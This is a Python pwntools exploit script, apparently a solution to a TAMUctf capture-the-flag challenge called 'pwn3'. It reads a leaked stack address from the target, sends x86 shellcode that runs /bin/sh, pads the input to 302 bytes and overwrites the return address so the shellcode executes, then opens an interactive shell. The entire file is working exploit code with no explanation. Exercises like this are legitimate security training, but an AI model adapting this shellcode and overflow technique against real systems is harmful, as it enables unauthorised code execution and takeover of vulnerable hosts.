from pwn import *
import struct
#r = remote('pwn.tamuctf.com', 4323)
r = process('pwn3')
context.binary = ELF('pwn3')
addressOutput = r.recvline()
print addressOutput
address = addressOutput[45:-2]
print address
paylod = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
padding = 'A' * (302 - len(paylod))
eip = bytes(address[2:])
print eip
eip = p32(int(eip, 16))

r.sendline(paylod + padding + eip)
r.interactive()
